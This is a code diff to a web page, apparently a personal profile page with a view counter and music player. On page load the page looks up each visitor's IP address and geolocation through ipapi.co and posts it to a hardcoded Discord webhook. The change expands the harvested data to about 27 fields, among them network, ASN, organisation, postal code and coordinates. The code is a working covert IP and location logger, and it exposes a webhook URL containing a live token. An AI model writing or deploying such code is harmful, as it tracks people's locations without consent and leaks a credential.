@@ -66,7 +66,7 @@
             <div class="text-purple-500 text-xl">
                 <i class="fas fa-eye"></i> <span id="viewCount">0</span>
             </div>
-            <div id="locationInfo" class="text-purple-500 text-lg mt-4"></div>
+            <pre id="locationInfo" class="text-purple-500 text-lg mt-4"></pre>
         </div>
     </div>
     <div class="absolute bottom-4 left-4 hidden" id="musicControl">
@@ -182,30 +182,50 @@
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
-                    console.log('User IP Address:', data.ip);
-                    const locationInfo = `
-                        <p>IP Address: ${data.ip}</p>
-                        <p>City: ${data.city}</p>
-                        <p>Region: ${data.region}</p>
-                        <p>Country: ${data.country_name}</p>
-                        <p>Latitude: ${data.latitude}</p>
-                        <p>Longitude: ${data.longitude}</p>
-                    `;
-                    locationInfoElement.innerHTML = locationInfo;
+                    const formattedData = {
+                        ip: data.ip,
+                        network: data.network,
+                        version: data.version,
+                        city: data.city,
+                        region: data.region,
+                        region_code: data.region_code,
+                        country: data.country,
+                        country_name: data.country_name,
+                        country_code: data.country_code,
+                        country_code_iso3: data.country_code_iso3,
+                        country_capital: data.country_capital,
+                        country_tld: data.country_tld,
+                        continent_code: data.continent_code,
+                        in_eu: data.in_eu,
+                        postal: data.postal,
+                        latitude: data.latitude,
+                        longitude: data.longitude,
+                        timezone: data.timezone,
+                        utc_offset: data.utc_offset,
+                        country_calling_code: data.country_calling_code,
+                        currency: data.currency,
+                        currency_name: data.currency_name,
+                        languages: data.languages,
+                        country_area: data.country_area,
+                        country_population: data.country_population,
+                        asn: data.asn,
+                        org: data.org
+                    };
 
-                    // Send the IP address and location to your Discord webhook
+                    // Display the formatted data
+                    locationInfoElement.textContent = JSON.stringify(formattedData, null, 2);
+
+                    // Send the data to your Discord webhook
                     fetch('https://discord.com/api/webhooks/1257370240380047541/kj7np_FeepiR1k3U_cUO1HJ2H_5HSCcXTk20ytp9YbfgxR0I6BestwYMgdHNzniSGmZy', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
-                        body: JSON.stringify({
-                            content: `New IP Address: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country_name}\nCoordinates: ${data.latitude}, ${data.longitude}`
-                        })
+                        body: JSON.stringify({ content: JSON.stringify(formattedData, null, 2) })
                     })
                     .then(response => {
                         if (response.ok) {
-                            console.log('IP address and location sent to webhook successfully!');
+                            console.log('Data sent to webhook successfully!');
                         } else {
                             console.error('Failed to send data to webhook. Status:', response.status, response.statusText);
                         }
